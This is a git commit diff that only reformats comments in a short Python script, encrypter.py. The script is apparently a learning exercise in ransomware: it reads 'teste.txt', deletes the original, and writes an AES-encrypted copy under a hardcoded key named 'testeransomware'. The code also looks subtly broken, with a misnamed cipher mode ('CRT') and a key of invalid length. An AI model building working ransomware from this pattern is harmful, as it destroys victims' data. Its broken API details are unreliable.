92c0740b77ed8f314d730add3e09662fcea4bef9
Bruno Kobzinski <59208502+bfkobzinski@users.noreply.github.com>
2025-01-15 17:11:57 -0300

    Update encrypter.py
    Correção limites

--- encrypter.py
+++ encrypter.py
@@ -1,26 +1,26 @@
-## Importando os modulos necessarios
+# Importando os modulos necessarios
 import os
 import pyaes
 
-## Abrir arquivo a ser criptografado
+# Abrir arquivo a ser criptografado
 file_name = 'teste.txt'
 file = open(file_name, 'rb')
-## Armazena o conteudo do arquivo em memoria
+# Armazena o conteudo do arquivo em memoria
 file_data = file.read()
 file.close()
 
-## Remover arquivo original
+# Remover arquivo original
 os.remove(file_name)
 
-## Definir chave de encriptacao
+# Definir chave de encriptacao
 key = b"testeransomware"
 aes = pyaes.AESModeOfOperationCRT(key)
 
-## Criptogafa o arquivo
+# Criptogafa o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## Cria o novo arquivo criptografado
+# Cria o novo arquivo criptografado
 new_file = file_name + '.encrypt'
-new_file = open(f'{new_file}','wb')
+new_file = open(f'{new_file}', 'wb')
 new_file.write(crypto_data)
 new_file.close()
